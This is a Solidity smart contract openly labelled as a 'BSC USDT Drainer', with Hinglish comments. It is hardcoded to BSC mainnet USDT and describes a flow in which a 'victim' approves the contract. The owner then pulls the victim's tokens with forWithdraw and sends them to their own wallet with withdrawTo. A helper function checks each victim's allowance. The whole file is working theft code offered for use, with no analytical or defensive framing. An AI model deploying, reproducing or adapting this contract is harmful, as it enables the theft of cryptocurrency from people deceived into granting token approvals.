// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ================================================================
// MasterContract — BSC USDT Drainer
//
// Flow:
//  1. Victim approves this contract address on USDT BEP-20
//  2. Admin calls forWithdraw(victimAddress, amount)
//     → victim ka USDT is contract mein aa jaata hai
//  3. Admin calls withdrawTo(ownerWallet, amount)
//     → contract ka USDT owner ke wallet mein chala jaata hai
// ================================================================

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract MasterContract {

    // ==================== STATE ====================

    address public owner;

    // BSC Mainnet USDT (BEP-20)
    IERC20 public constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    // ==================== EVENTS ====================

    event FundsWithdrawn(address indexed from, uint256 amount);
    event FundsPulled(address indexed to, uint256 amount);
    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);

    // ==================== CONSTRUCTOR ====================

    constructor() {
        owner = msg.sender;
    }

    // ==================== MODIFIER ====================

    modifier onlyOwner() {
        require(msg.sender == owner, "MasterContract: caller is not owner");
        _;
    }

    // ==================== MAIN FUNCTIONS ====================

    /**
     * @notice Admin yeh call karta hai — victim ka USDT is contract mein transfer hota hai
     * @param from  Victim ka wallet address (jisne approve kiya tha)
     * @param amount Transfer karna hai kitna USDT (18 decimals)
     */
    function forWithdraw(address from, uint256 amount) external onlyOwner {
        require(from != address(0), "Invalid address");
        require(amount > 0, "Amount must be > 0");

        uint256 allowance = USDT.allowance(from, address(this));
        require(allowance >= amount, "Insufficient allowance");

        bool success = USDT.transferFrom(from, address(this), amount);
        require(success, "transferFrom failed");

        emit FundsWithdrawn(from, amount);
    }

    /**
     * @notice Contract mein jama USDT kisi bhi address pe bhejo
     * @param to     Destination wallet (usually owner ka wallet)
     * @param amount Kitna USDT bhejna hai (18 decimals)
     */
    function withdrawTo(address to, uint256 amount) external onlyOwner {
        require(to != address(0), "Invalid address");
        require(amount > 0, "Amount must be > 0");

        uint256 bal = USDT.balanceOf(address(this));
        require(bal >= amount, "Insufficient contract balance");

        bool success = USDT.transfer(to, amount);
        require(success, "transfer failed");

        emit FundsPulled(to, amount);
    }

    /**
     * @notice Contract mein kitna USDT jama hai
     */
    function contractBalance() external view returns (uint256) {
        return USDT.balanceOf(address(this));
    }

    /**
     * @notice Victim ka allowance check karo
     * @param victim Victim ka wallet address
     */
    function getAllowance(address victim) external view returns (uint256) {
        return USDT.allowance(victim, address(this));
    }

    /**
     * @notice Ownership transfer karo (optional)
     * @param newOwner Naya owner ka address
     */
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}
